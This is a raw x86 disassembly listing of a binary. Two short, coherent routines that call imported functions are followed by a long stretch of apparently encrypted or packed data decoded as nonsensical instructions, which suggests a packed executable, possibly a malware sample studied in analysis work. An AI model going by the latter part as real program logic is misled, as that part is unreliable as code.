  4d0a01:	add    BYTE PTR [eax],al
  4d0a03:	add    BYTE PTR [eax],al
  4d0a05:	add    BYTE PTR [eax],al
  4d0a07:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a0d:	sub    esp,0x3c
  4d0a10:	lea    esi,ds:0x4d3118
  4d0a16:	sub    eax,DWORD PTR [esi-0xac]
  4d0a1c:	push   esi
  4d0a1d:	push   DWORD PTR [esi+0x13c]
  4d0a23:	push   DWORD PTR [esi+0x1fc]
  4d0a29:	push   DWORD PTR [esi+0x1d8]
  4d0a2f:	push   ecx
  4d0a30:	call   0x4d048c
  4d0a35:	add    esp,0x10
  4d0a38:	pop    esi
  4d0a39:	push   0x0
  4d0a3b:	notrack call DWORD PTR ds:0x4d200c
  4d0a42:	push   0x0
  4d0a44:	notrack call DWORD PTR ds:0x4d2000
  4d0a4b:	add    esp,0x3c
  4d0a4e:	pop    ebp
  4d0a4f:	ret    
	...
  4d0a5c:	mov    edi,edi
  4d0a5e:	push   ebp
  4d0a5f:	mov    ebp,esp
  4d0a61:	sub    esp,0x58
  4d0a64:	mov    eax,0x4d30d8
  4d0a69:	add    ecx,DWORD PTR [ebp-0x10]
  4d0a6c:	push   eax
  4d0a6d:	push   0x0
  4d0a6f:	notrack call DWORD PTR ds:0x4d2038
  4d0a76:	pop    eax
  4d0a77:	push   eax
  4d0a78:	push   DWORD PTR [eax+0x64]
  4d0a7b:	push   DWORD PTR [eax+0x180]
  4d0a81:	push   DWORD PTR [eax+0x194]
  4d0a87:	push   edi
  4d0a88:	call   0x4d011c
  4d0a8d:	add    esp,0x10
  4d0a90:	pop    eax
  4d0a91:	push   eax
  4d0a92:	push   0x0
  4d0a94:	notrack call DWORD PTR ds:0x4d2038
  4d0a9b:	pop    eax
  4d0a9c:	add    esp,0x58
  4d0a9f:	pop    ebp
  4d0aa0:	ret    
	...
  4d0aa9:	add    BYTE PTR [eax],al
  4d0aab:	add    BYTE PTR [esp+edi*8],ah
  4d0aae:	and    dl,dl
  4d0ab0:	pop    ebp
  4d0ab1:	pusha  
  4d0ab2:	pusha  
  4d0ab3:	or     ebx,DWORD PTR [esp+edi*8+0x47]
  4d0ab7:	mov    edx,esi
  4d0ab9:	je     0x63affd77
  4d0abf:	push   ss
  4d0ac0:	jnp    0x4d0a48
  4d0ac2:	clc    
  4d0ac3:	call   0x2e1a:0xaff45e2a
  4d0aca:	sub    DWORD PTR [edi+0x5f],edi
  4d0acd:	ins    DWORD PTR es:[edi],dx
  4d0ace:	mov    ch,0x9a
  4d0ad0:	fiadd  DWORD PTR [edi+eiz*1-0x25]
  4d0ad4:	sbb    al,0x2f
  4d0ad6:	and    DWORD PTR [eax+0x23],esp
  4d0ad9:	scas   al,BYTE PTR es:[edi]
  4d0ada:	sbb    BYTE PTR [ebx+0x25b34cc7],dl
  4d0ae0:	pushf  
  4d0ae1:	or     DWORD PTR [ecx+ebx*8],edi
  4d0ae4:	repnz or ecx,0x7402221c
  4d0aeb:	or     eax,0x9de45a71
  4d0af0:	pop    ecx
  4d0af1:	xchg   ebx,eax
  4d0af2:	addr16 pop esp
  4d0af4:	pop    ecx
  4d0af5:	(bad)  
  4d0af6:	cmp    DWORD PTR [esi+0x4afd45a3],edi
  4d0afc:	dec    edx
  4d0afd:	dec    eax
  4d0afe:	std    
  4d0aff:	dec    edx
  4d0b00:	dec    ecx
  4d0b01:	enter  0x5bc7,0x9f
  4d0b05:	lods   eax,DWORD PTR ds:[esi]
  4d0b06:	stos   DWORD PTR es:[edi],eax
  4d0b07:	push   0x4cf83ac
  4d0b0c:	mov    edi,0x3d549783
  4d0b11:	sbb    DWORD PTR [esi+edi*2+0x5b],0x6
  4d0b16:	mov    ds:0xa0decfa8,eax
  4d0b1b:	jmp    0x4d0b0f
  4d0b1d:	pop    edi
  4d0b1e:	fdivr  DWORD PTR [ebx-0x4423200f]
  4d0b24:	xchg   ah,dh
  4d0b26:	xor    al,0x49
  4d0b28:	xor    ah,0x34
  4d0b2b:	adc    al,0x8
  4d0b2d:	add    DWORD PTR [ebp-0x72fef8fc],ecx
  4d0b33:	test   eax,0xa98ff3ee
  4d0b38:	in     eax,dx
  4d0b39:	jp     0x4d0b04
  4d0b3b:	push   ebp
  4d0b3c:	push   cs
  4d0b3d:	(bad)  
  4d0b3e:	mov    ds:0xcfce6536,eax
  4d0b43:	pop    edx
  4d0b44:	or     DWORD PTR [esi-0x2998c079],esp
  4d0b4a:	shr    DWORD PTR [edi+edx*4-0x7d],cl
  4d0b4e:	frstpm(287 only) 
  4d0b50:	nop
  4d0b51:	jmp    0x9c229931
  4d0b56:	mov    esi,0xdbd3bce8
  4d0b5b:	mov    ebx,ecx
  4d0b5d:	xchg   DWORD PTR [eax+0x18f9d76],ecx
  4d0b63:	xor    BYTE PTR [eax-0xed73af4],bl
  4d0b69:	dec    esp
  4d0b6a:	lods   eax,DWORD PTR ds:[esi]
  4d0b6b:	sub    al,ah
  4d0b6d:	dec    esp
  4d0b6e:	lods   eax,DWORD PTR ds:[esi]
  4d0b6f:	inc    eax
  4d0b70:	inc    ebx
  4d0b71:	dec    edx
  4d0b72:	lods   eax,DWORD PTR ds:[esi]
  4d0b73:	inc    eax
  4d0b74:	sub    BYTE PTR [edx+0x52],cl
  4d0b77:	adc    eax,0x10aac137
  4d0b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0b7d:	shr    DWORD PTR [edx+0x1f4cf610],0xc0
  4d0b84:	push   cs
  4d0b85:	mov    bl,0xe0
  4d0b87:	jns    0x4d0b32
  4d0b89:	mov    ch,0xe0
  4d0b8b:	jns    0x4d0be6
  4d0b8d:	adc    DWORD PTR [ebx],esp
  4d0b8f:	xchg   ecx,eax
  4d0b90:	iret   
  4d0b91:	adc    al,0x23
  4d0b93:	xchg   ecx,eax
  4d0b94:	xchg   ecx,eax
  4d0b95:	dec    edx
  4d0b96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0b98:	mov    ah,0x1c
  4d0b9a:	dec    esp
  4d0b9b:	pop    esp
  4d0b9c:	scas   eax,DWORD PTR es:[edi]
  4d0b9d:	sbb    al,0x4c
  4d0b9f:	mov    ah,0x97
  4d0ba1:	sbb    DWORD PTR [esp+esi*4+0x1b],ecx
  4d0ba5:	loope  0x4d0bcd
  4d0ba7:	mov    ah,0x70
  4d0ba9:	loope  0x4d0b84
  4d0bab:	rcl    DWORD PTR [ebx],0xb6
  4d0bae:	es xchg esp,eax
  4d0bb0:	cmp    bh,BYTE PTR ds:0x3d4ffc6b
  4d0bb6:	aas    
  4d0bb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0bb8:	scas   eax,DWORD PTR es:[edi]
  4d0bb9:	or     DWORD PTR [ebx],ebx
  4d0bbb:	hlt    
  4d0bbc:	std    
  4d0bbd:	pop    edi
  4d0bbe:	dec    esp
  4d0bbf:	or     esp,DWORD PTR [edi+0x575c1473]
  4d0bc5:	es or  al,0xb4
  4d0bc8:	jge    0x4d0bef
  4d0bca:	or     al,0xb4
  4d0bcc:	cmc    
  4d0bcd:	arpl   WORD PTR [eax],si
  4d0bcf:	cmp    eax,esi
  4d0bd1:	gs push esi
  4d0bd3:	into   
  4d0bd4:	scas   eax,DWORD PTR es:[edi]
  4d0bd5:	jae    0x4d0c2d
  4d0bd7:	out    dx,al
  4d0bd8:	fldenv [ebp+0x6f]
  4d0bdb:	mov    dh,0xec
  4d0bdd:	adc    DWORD PTR [esi+0x3d],edi
  4d0be0:	mov    bl,0x25
  4d0be2:	adc    al,0x39
  4d0be4:	fisub  DWORD PTR ds:0xdad93924
  4d0bea:	push   esp
  4d0beb:	imul   ecx,DWORD PTR [ecx+0x1790125],0x54296d58
  4d0bf5:	xor    ch,BYTE PTR [ecx+0x7e]
  4d0bf8:	push   es
  4d0bf9:	int    0x3c
  4d0bfb:	jb     0x4d0c4e
  4d0bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0bfe:	ds and eax,0xeab5f101
  4d0c04:	mov    DWORD PTR [edx],ecx
  4d0c06:	inc    esi
  4d0c07:	dec    esi
  4d0c08:	(bad)  
  4d0c09:	cmc    
  4d0c0a:	adc    eax,DWORD PTR [edx-0x73]
  4d0c0d:	jle    0x4d0bec
  4d0c0f:	inc    ecx
  4d0c10:	ret    
  4d0c11:	inc    edx
  4d0c12:	push   eax
  4d0c13:	cmp    dl,bl
  4d0c15:	leave  
  4d0c16:	pop    es
  4d0c17:	sbb    ah,dl
  4d0c19:	jle    0x4d0c61
  4d0c1b:	or     al,0xd6
  4d0c1d:	xchg   BYTE PTR [ecx-0x45],cl
  4d0c20:	sahf   
  4d0c21:	sub    BYTE PTR [ecx],0x30
  4d0c24:	fcom   DWORD PTR [esp+ebp*4+0x27d5abf0]
  4d0c2b:	mov    bh,0xa2
  4d0c2d:	push   eax
  4d0c2e:	out    0xc3,eax
  4d0c30:	xchg   edi,eax
  4d0c31:	mov    eax,0xb896c776
  4d0c36:	std    
  4d0c37:	nop    edi
  4d0c3a:	(bad)  
  4d0c3c:	push   0x6ae7d9fd
  4d0c41:	mov    cl,ch
  4d0c43:	sbb    BYTE PTR [edx+ebx*4],bl
  4d0c46:	inc    esi
  4d0c47:	setns  BYTE PTR [di+0x5e3c]
  4d0c4d:	adc    ch,BYTE PTR [ecx+0x6e]
  4d0c50:	or     eax,0x5e3f3e43
  4d0c55:	sub    DWORD PTR [edx],edi
  4d0c57:	outs   dx,BYTE PTR ds:[esi]
  4d0c58:	or     dh,dl
  4d0c5a:	outs   dx,DWORD PTR ds:[esi]
  4d0c5b:	bound  edx,QWORD PTR [eax-0x1b]
  4d0c5e:	scas   eax,DWORD PTR es:[edi]
  4d0c5f:	xor    eax,0xbef04fa2
  4d0c64:	push   0x3c4154bc
  4d0c69:	mov    al,0xc
  4d0c6b:	and    BYTE PTR [esi+0xec22477],bh
  4d0c71:	lahf   
  4d0c72:	das    
  4d0c73:	ret    
  4d0c74:	or     eax,0xc42c79f
  4d0c79:	lahf   
  4d0c7a:	(bad)  
  4d0c7b:	sbb    ah,BYTE PTR [ebx-0x61]
  4d0c7e:	xchg   DWORD PTR [edx],ebx
  4d0c80:	bound  esp,QWORD PTR [eax-0xe]
  4d0c83:	jb     0x4d0cb8
  4d0c85:	jmp    0x4d0c90
  4d0c87:	stc    
  4d0c88:	ret    0x303
  4d0c8b:	std    
  4d0c8c:	rol    DWORD PTR [ebx],0x67
  4d0c8f:	add    dh,bl
  4d0c91:	xor    esp,DWORD PTR [edi+0x2]
  4d0c94:	repnz imul ebp,esp,0x42
  4d0c98:	std    
  4d0c99:	loopne 0x4d0c47
  4d0c9b:	dec    esi
  4d0c9c:	ret    
  4d0c9d:	mov    eax,0x33c63ab4
  4d0ca2:	mov    ah,0xd1
  4d0ca4:	xor    BYTE PTR [eax-0xecd0a48],bh
  4d0caa:	test   BYTE PTR [esi+0x42],bh
  4d0cad:	fld    DWORD PTR [edi-0x605e3577]
  4d0cb3:	add    BYTE PTR [ecx-0x8080643],bh
  4d0cb9:	stos   DWORD PTR es:[edi],eax
  4d0cba:	stc    
  4d0cbb:	xlat   BYTE PTR ds:[ebx]
  4d0cbc:	and    DWORD PTR [edi-0x58678963],0xe712769d
  4d0cc6:	lods   eax,DWORD PTR ds:[esi]
  4d0cc7:	jmp    FWORD PTR [ecx-0x11]
  4d0cca:	push   edx
  4d0ccb:	stos   BYTE PTR es:[edi],al
  4d0ccc:	jl     0x4d0cd5
  4d0cce:	and    al,0xa8
  4d0cd0:	jnp    0x4d0cd9
  4d0cd2:	jns    0x4d0d35
  4d0cd4:	and    cl,BYTE PTR [esi-0x10c2baf3]
  4d0cda:	pop    ebp
  4d0cdb:	lods   eax,DWORD PTR ds:[esi]
  4d0cdc:	(bad)  
  4d0cdd:	jmp    0xf525:0x6ba6ad5d
  4d0ce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0ce5:	imul   esp,DWORD PTR ds:0xae66cff5,0xaaa1eaf1
  4d0cef:	aad    0xe9
  4d0cf1:	mov    eax,ds:0xd515d5aa
  4d0cf6:	mov    ss,ecx
  4d0cf8:	inc    esp
  4d0cf9:	out    0x4e,al
  4d0cfb:	adc    ah,BYTE PTR [ebx]
  4d0cfd:	ins    DWORD PTR es:[edi],dx
  4d0cfe:	mov    ebp,0x36515411
  4d0d03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0d04:	rcl    DWORD PTR [ecx+0x36],cl
  4d0d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0d08:	push   ebp
  4d0d09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0d0a:	inc    edx
  4d0d0b:	aam    0x55
  4d0d0d:	push   esp
  4d0d0e:	leave  
  4d0d0f:	stos   BYTE PTR es:[edi],al
  4d0d10:	pop    eax
  4d0d11:	shl    DWORD PTR [esi],1
  4d0d13:	fidiv  WORD PTR [ecx]
  4d0d15:	ror    ch,cl
  4d0d17:	mov    ebp,ecx
  4d0d19:	xchg   ecx,ecx
  4d0d1b:	or     al,0xc
  4d0d1d:	repnz int 0x5b
  4d0d20:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0d22:	int    0xb
  4d0d24:	mov    ds:0x9f1bbb2c,eax
  4d0d29:	fbstp  TBYTE PTR [eax]
  4d0d2b:	in     eax,0x31
  4d0d2d:	pop    edx
  4d0d2e:	lock nop
  4d0d30:	leave  
  4d0d31:	jno    0x4d0d3a
  4d0d33:	sbb    eax,DWORD PTR [esi]
  4d0d35:	das    
  4d0d36:	push   esi
  4d0d37:	dec    ebx
  4d0d38:	push   ecx
  4d0d39:	inc    ebp
  4d0d3a:	push   edx
  4d0d3b:	sbb    al,BYTE PTR ds:0x521607ba
  4d0d41:	xor    DWORD PTR [ecx],eax
  4d0d43:	xchg   ebx,eax
  4d0d44:	xchg   ecx,eax
  4d0d45:	mov    eax,ds:0xb1d61891
  4d0d4a:	sbb    al,0x2c
  4d0d4c:	aam    0xe6
  4d0d4e:	mov    cl,0xa9
  4d0d50:	adc    edx,DWORD PTR [edx-0x6dedff56]
  4d0d56:	stos   BYTE PTR es:[edi],al
  4d0d57:	and    BYTE PTR [esi-0x6a],0x27
  4d0d5b:	les    esp,FWORD PTR [esp+edx*4+0x2]
  4d0d5f:	cmp    ebx,DWORD PTR [edx+0x646b7d6b]
  4d0d65:	pop    ds
  4d0d66:	pop    ecx
  4d0d67:	jg     0x4d0d03
  4d0d69:	dec    edx
  4d0d6a:	push   ecx
  4d0d6b:	aam    0x70
  4d0d6d:	stos   BYTE PTR es:[edi],al
  4d0d6e:	push   cs
  4d0d6f:	mov    ah,BYTE PTR [edi]
  4d0d71:	repz pop edx
  4d0d73:	fidiv  DWORD PTR [ebp-0x5c]
  4d0d76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0d77:	(bad)  
  4d0d78:	js     0x4d0d76
  4d0d7a:	es dec ecx
  4d0d7c:	imul   edx,DWORD PTR [edi],0xffffffa9
  4d0d7f:	sub    BYTE PTR [edi+0x2bfb2277],ah
  4d0d85:	test   DWORD PTR [ecx],esp
  4d0d87:	lea    edx,[esi]
  4d0d89:	scas   al,BYTE PTR es:[edi]
  4d0d8a:	ja     0x4d0d45
  4d0d8c:	xchg   edx,eax
  4d0d8d:	jl     0x4d0e07
  4d0d8f:	cmp    eax,0x3d787c06
  4d0d94:	mov    edx,?
  4d0d96:	fdivr  QWORD PTR ds:0x8b57f28b
  4d0d9c:	sub    dh,dl
  4d0d9e:	push   edi
  4d0d9f:	mov    ebp,DWORD PTR [esi+0x2e0f5804]
  4d0da5:	add    al,0x58
  4d0da7:	cvttps2pi mm6,xmm7
  4d0daa:	cmc    
  4d0dab:	test   bl,dl
  4d0dad:	hlt    
  4d0dae:	push   cs
  4d0daf:	aam    0x57
  4d0db1:	xor    BYTE PTR [esi-0x7b],bl
  4d0db4:	add    al,0x60
  4d0db6:	xor    al,0x81
  4d0db8:	imul   esp,DWORD PTR [eax+0x24],0xffffff81
  4d0dbc:	push   0x37
  4d0dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0dbf:	imul   ebp,DWORD PTR [ebp+0x67],0x67046dcd
  4d0dc6:	(bad)  [ebp+0x3]
  4d0dc9:	xor    BYTE PTR [ecx+ebp*2+0x26],bl
  4d0dcd:	xor    BYTE PTR [ecx+ebp*2+0x25],cl
  4d0dd1:	iret   
  4d0dd2:	sbb    DWORD PTR [ebp-0x27],esp
  4d0dd5:	call   0xf73e:0x377f3f15
  4d0ddc:	sub    eax,0xc326f6bc
  4d0de1:	aas    
  4d0de2:	pop    ds
  4d0de3:	and    ch,bh
  4d0de5:	(bad)  
  4d0de6:	jns    0x4d0d77
  4d0de8:	mov    BYTE PTR [esi+0x79],dl
  4d0deb:	mov    edi,0x405c5efb
  4d0df0:	repz pop esi
  4d0df2:	pop    esp
  4d0df3:	inc    ecx
  4d0df4:	out    0x59,al
  4d0df6:	mov    esi,0xfad4beaf
  4d0dfb:	mov    edi,DWORD PTR [ecx+0x45dba885]
  4d0e01:	mov    ch,0xc0
  4d0e03:	fist   DWORD PTR [ebp+esi*4-0x40]
  4d0e07:	mov    esi,ss
  4d0e09:	pop    ebp
  4d0e0a:	(bad)  
  4d0e0b:	fsubr  QWORD PTR [eax]
  4d0e0d:	ins    DWORD PTR es:[edi],dx
  4d0e0e:	lods   al,BYTE PTR ds:[esi]
  4d0e0f:	fdiv   QWORD PTR [edi]
  4d0e11:	ins    DWORD PTR es:[edi],dx
  4d0e12:	lods   al,BYTE PTR ds:[esi]
  4d0e13:	mov    esi,DWORD PTR [ebp-0x5b747797]
  4d0e19:	imul   ecx,DWORD PTR [eax+0x7765f074],0x2e3ffb21
  4d0e23:	jns    0x4d0dc7
  4d0e25:	mov    edx,0xdb220ce7
  4d0e2a:	and    al,0x6c
  4d0e2c:	enter  0x89dc,0x8e
  4d0e30:	xor    al,0x51
  4d0e32:	mov    ebp,0x55daf68d
  4d0e37:	push   es
  4d0e38:	add    al,0x63
  4d0e3a:	inc    ebp
  4d0e3b:	push   es
  4d0e3c:	add    esp,DWORD PTR [ebx-0x53]
  4d0e3f:	in     eax,dx
  4d0e40:	sti    
  4d0e41:	pushf  
  4d0e42:	push   edx
  4d0e43:	push   esp
  4d0e44:	jecxz  0x4d0de2
  4d0e46:	push   edx
  4d0e47:	push   esp
  4d0e48:	or     bh,BYTE PTR [ebp-0x53]
  4d0e4b:	stos   DWORD PTR es:[edi],eax
  4d0e4c:	hlt    
  4d0e4d:	sub    edx,DWORD PTR [esp+ebp*4]
  4d0e50:	repz sub edx,DWORD PTR [esp+eax*2]
  4d0e54:	and    al,0xd4
  4d0e56:	jmp    0x4d0e13
  4d0e58:	scas   al,BYTE PTR es:[edi]
  4d0e59:	add    al,0x60
  4d0e5b:	(bad)
  4d0e5f:	(bad)
  4d0e63:	dec    eax
  4d0e64:	jbe    0x4d0ea8
  4d0e66:	jle    0x4d0e2b
  4d0e68:	xchg   ecx,ecx
  4d0e6a:	mov    ah,0x2b
  4d0e6c:	cmp    BYTE PTR [esi],dh
  4d0e6e:	dec    ebx
  4d0e6f:	aam    0xa
  4d0e71:	neg    BYTE PTR [ebx]
  4d0e73:	adc    eax,0x11daf1c1
  4d0e78:	in     al,0xfc
  4d0e7a:	fist   DWORD PTR ds:0xd55f50bf
  4d0e80:	leave  
  4d0e81:	mov    eax,ds:0x9a3d5e07
  4d0e86:	ret    0x3d2a
  4d0e89:	shl    BYTE PTR [edi-0x6c1b4a09],1
  4d0e8f:	dec    esi
  4d0e90:	mov    esi,0x554e93e4
  4d0e95:	jno    0x4d0f03
  4d0e97:	mov    cl,0xa9
  4d0e99:	jle    0x4d0e76
  4d0e9b:	mov    ebp,0x48a20fe
  4d0ea0:	cmc    
  4d0ea1:	and    BYTE PTR [edx+0x75a51c04],cl
  4d0ea7:	sti    
  4d0ea8:	loop   0x4d0ea6
  4d0eaa:	popf   
  4d0eab:	test   BYTE PTR [ebx+eax*1],bl
  4d0eae:	bound  ecx,QWORD PTR ds:0x6c7e2767
  4d0eb4:	mov    ds:0xbd84bf76,eax
  4d0eb9:	iret   
  4d0eba:	lahf   
  4d0ebb:	test   BYTE PTR [edi+ecx*8+0x768bf0d7],bh
  4d0ec2:	aad    0xf0
  4d0ec4:	mov    dh,BYTE PTR [esi-0x63]
  4d0ec7:	test   BYTE PTR [ecx-0x5f7b4231],ah
  4d0ecd:	iret   
  4d0ece:	cmc    
  4d0ecf:	lock jg 0x4d0f48
  4d0ed2:	icebp  
  4d0ed3:	lock jle 0x4d0f4c
  4d0ed6:	mov    ecx,0xf9cf6584
  4d0edb:	test   BYTE PTR [edi+ecx*8-0x4f],ah
  4d0edf:	lock jae 0x4d0f58
  4d0ee2:	mov    ch,0xf0
  4d0ee4:	jb     0x4d0f5c
  4d0ee6:	std    
  4d0ee7:	test   BYTE PTR [ecx-0x31],bh
  4d0eea:	mov    ebp,0xf5cf7884
  4d0eef:	lock ja 0x4d0f36
  4d0ef2:	xor    al,0xa9
  4d0ef4:	mov    bl,0x24
  4d0ef6:	mov    edi,0x4da5c2fc
  4d0efb:	ins    DWORD PTR es:[edi],dx
  4d0efc:	daa    
  4d0efd:	loopne 0x4d0f34
  4d0eff:	out    0x69,al
  4d0f01:	mov    BYTE PTR [esi-0x190a16e8],bh
  4d0f07:	sbb    BYTE PTR [esi+esi*8+0x7dc36de7],bl
  4d0f0e:	mov    ds:0xd6bd450d,al
  4d0f13:	sbb    bl,cl
  4d0f15:	sti    
  4d0f16:	jmp    0x6f4a:0xeaff704a
  4d0f1d:	pop    ss
  4d0f1e:	dec    edi
  4d0f1f:	dec    ebx
  4d0f20:	outs   dx,BYTE PTR ds:[esi]
  4d0f21:	pop    ss
  4d0f22:	adc    eax,0xed149d48
  4d0f27:	arpl   WORD PTR [edi+ebp*1-0x68],dx
  4d0f2b:	cmp    esp,DWORD PTR [eax]
  4d0f2d:	and    bl,BYTE PTR [ebx-0x19de84b2]
  4d0f33:	adc    cl,BYTE PTR [edi+0x6c]
  4d0f36:	mov    edx,0xb1188597
  4d0f3b:	cmp    dl,ah
  4d0f3d:	sub    esi,DWORD PTR [ebx+0x60]
  4d0f40:	jle    0x4d0eea
  4d0f42:	call   0xfaa0:0xfb4b9b63
  4d0f49:	enter  0xec86,0xf9
  4d0f4d:	mov    esp,0xbcf50494
  4d0f52:	xchg   esp,eax
  4d0f53:	add    al,0x7d
  4d0f55:	rol    eax,0x81
  4d0f58:	xor    DWORD PTR [ebp+0x16682ac6],0x77672ac6
  4d0f62:	add    eax,0x3922974a
  4d0f67:	ror    DWORD PTR [esi-0x57],0x4c
  4d0f6b:	(bad)  
  4d0f6c:	(bad)  
  4d0f6d:	in     al,dx
  4d0f6e:	sbb    al,0xdd
  4d0f70:	xchg   ebx,eax
  4d0f71:	test   BYTE PTR [ebx*8+0x224f849e],bl
  4d0f78:	retf   0x16c4
  4d0f7b:	jb     0x4d0fbd
  4d0f7d:	cmp    al,0xe5
  4d0f7f:	(bad)  
  4d0f80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0f81:	add    al,0xe5
  4d0f83:	(bad)  
  4d0f84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0f85:	dec    esp
  4d0f86:	ins    BYTE PTR es:[edi],dx
  4d0f87:	xchg   edx,eax
  4d0f88:	sub    DWORD PTR [edi+eiz*8+0x6a],0x6e5a600b
  4d0f90:	or     ah,BYTE PTR [eax+0x5a]
  4d0f93:	or     ch,BYTE PTR [edx-0x56f5a588]
  4d0f99:	repz sub ah,BYTE PTR [esi]
  4d0f9c:	neg    DWORD PTR [ebx-0x6405d9d6]
  4d0fa2:	jns    0x4d0f7d
  4d0fa4:	scas   al,BYTE PTR es:[edi]
  4d0fa5:	fcomi  st,st(4)
  4d0fa7:	aad    0x15
  4d0fa9:	push   esp
  4d0faa:	cmc    
  4d0fab:	test   DWORD PTR [ebp+0x6d7d7e9b],ebx
  4d0fb1:	ds sbb bl,ah
  4d0fb4:	je     0x4d0ff4
  4d0fb6:	sbb    bl,ah
  4d0fb8:	cli    
  4d0fb9:	jle    0x4d0ff1
  4d0fbb:	mov    ebp,0x51b71e38
  4d0fc0:	pop    ss
  4d0fc1:	sbb    al,0xb7
  4d0fc3:	push   ecx
  4d0fc4:	jle    0x4d0ffe
  4d0fc6:	mov    ch,0x51
  4d0fc8:	jge    0x4d0fd5
  4d0fca:	inc    ebx
  4d0fcb:	cmp    edi,DWORD PTR [ecx+eiz*2+0x4b]
  4d0fcf:	les    ebp,FWORD PTR [eax]
  4d0fd1:	jge    0x4d0f93
  4d0fd3:	sbb    al,0x7b
  4d0fd5:	cs aas 
  4d0fd7:	dec    ecx
  4d0fd8:	dec    esi
  4d0fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0fda:	jnp    0x4d1049
  4d0fdc:	push   ecx
  4d0fdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0fde:	cmp    edx,DWORD PTR [ecx-0x27]
  4d0fe1:	es sti 
  4d0fe3:	push   ecx
  4d0fe4:	fsub   DWORD PTR [esi]
  4d0fe6:	jle    0x4d0f79
  4d0fe8:	stos   DWORD PTR es:[edi],eax
  4d0fe9:	daa    
  4d0fea:	cmp    ch,al
  4d0fec:	neg    eax
  4d0fee:	ins    DWORD PTR es:[edi],dx
  4d0fef:	std    
  4d0ff0:	jno    0x4d100a
  4d0ff2:	sbb    BYTE PTR [eax],bl
  4d0ff4:	and    edi,esp
  4d0ff6:	dec    ebp
  4d0ff7:	add    BYTE PTR [edi-0x61fd96dd],bl
  4d0ffd:	and    esp,eax
  4d0fff:	jbe    0x4d0fba
  4d1001:	aas    
  4d1002:	xor    DWORD PTR [ebp-0x2612a828],0xab8557d7
  4d100c:	mov    ds:0xcec3e179,al
  4d1011:	or     dl,BYTE PTR [edi-0x3d0a6660]
  4d1017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d1018:	sbb    esi,DWORD PTR ds:0xca4eacb7
  4d101e:	loop   0x4d0fcc
  4d1020:	retf   0x960a
  4d1023:	loope  0x4d0fc4
  4d1025:	or     bh,dh
  4d1027:	mov    al,dh
  4d1029:	jle    0x4d0fc3
  4d102b:	loopne 0x4d0fc2
  4d102d:	or     eax,ebp
  4d102f:	xchg   edx,eax
  4d1030:	rcr    BYTE PTR [ecx+0x17],0xc7
  4d1034:	(bad)  
  4d1035:	fcmovbe st,st(3)
  4d1037:	retf   
  4d1038:	dec    ebx
  4d1039:	sub    al,BYTE PTR [ebx-0x1695df61]
  4d103f:	cwde   
  4d1040:	jne    0x4d0fd7
  4d1042:	mov    esp,0xe8c52c94
  4d1047:	les    eax,FWORD PTR [ebp-0x3e]
  4d104a:	mov    esi,0xbec2622c
  4d104f:	sub    al,0xe8
  4d1051:	(bad)  
  4d1052:	call   0x2dad:0x9aec2ead
  4d1059:	xchg   BYTE PTR [ebp-0x25dd220c],bl
  4d105f:	jg     0x4d107b
  4d1061:	mov    DWORD PTR [edi+0x1],edx
  4d1064:	loop   0x4d109f
  4d1066:	aas    
  4d1067:	stos   DWORD PTR es:[edi],eax
  4d1068:	mov    ecx,0x12688f92
  4d106d:	ins    DWORD PTR es:[edi],dx
  4d106e:	fisub  DWORD PTR [ecx+ecx*2-0x12]
  4d1072:	push   ds
  4d1073:	push   0x97462d27
  4d1078:	idiv   BYTE PTR [eax-0x52]
  4d107b:	or     ebp,esi
  4d107d:	js     0x4d102d
  4d107f:	push   esp
  4d1080:	ja     0x4d10bf
  4d1082:	(bad)  
  4d1084:	mov    dh,0x39
  4d1086:	push   edi
  4d1087:	xchg   ebx,eax
  4d1088:	xchg   ecx,eax
  4d1089:	sub    DWORD PTR [edx],ecx
  4d108b:	xchg   ebx,eax
  4d108c:	nop
  4d108d:	sub    DWORD PTR [edx],ecx
  4d108f:	xchg   ebx,eax
  4d1090:	vprotq xmm9,[esi-0x18af9dd7],xmm3
  4d1099:	sbb    dl,BYTE PTR [esi+esi*1+0x50ce575c]
  4d10a0:	lock xor ebp,edi
  4d10a3:	add    BYTE PTR [ebx-0x7f9183c7],0x29
  4d10aa:	jl     0x4d111a
  4d10ac:	push   0xffffffc4
  4d10ae:	icebp  
  4d10af:	xor    BYTE PTR [ebx+0x61450e40],dl
  4d10b5:	retf   
  4d10b6:	js     0x4d1137
  4d10b8:	push   es
  4d10b9:	jno    0x4d10e3
  4d10bb:	cmp    cl,BYTE PTR [edx+0x265c3645]
  4d10c1:	and    eax,DWORD PTR ds:0xc6c3528c
  4d10c7:	frstor [eax+0xa]
  4d10ca:	xchg   esi,esi
  4d10cc:	mov    eax,ds:0xa2828372
  4d10d1:	cdq    
  4d10d2:	je     0x4d1085
  4d10d4:	popa   
  4d10d5:	call   0xd875:0xc39c53b6
  4d10dc:	loopne 0x4d1089
  4d10de:	pop    ds
  4d10df:	fadd   QWORD PTR [edi-0x7923f055]
  4d10e5:	cld    
  4d10e6:	fdivr  QWORD PTR gs:[eax-0x57]
  4d10ea:	jne    0x4d1143
  4d10ec:	xchg   DWORD PTR [eax],ebp
  4d10ee:	cdq    
  4d10ef:	push   ebx
  4d10f0:	test   DWORD PTR [eax],ebp
  4d10f2:	cdq    
  4d10f3:	fdivr  DWORD PTR [eax+0x40]
  4d10f6:	popf   
  4d10f7:	fnstenv [edi+0x40]
  4d10fa:	retf   0x878a
  4d10fd:	adc    eax,0x7d86e0ea
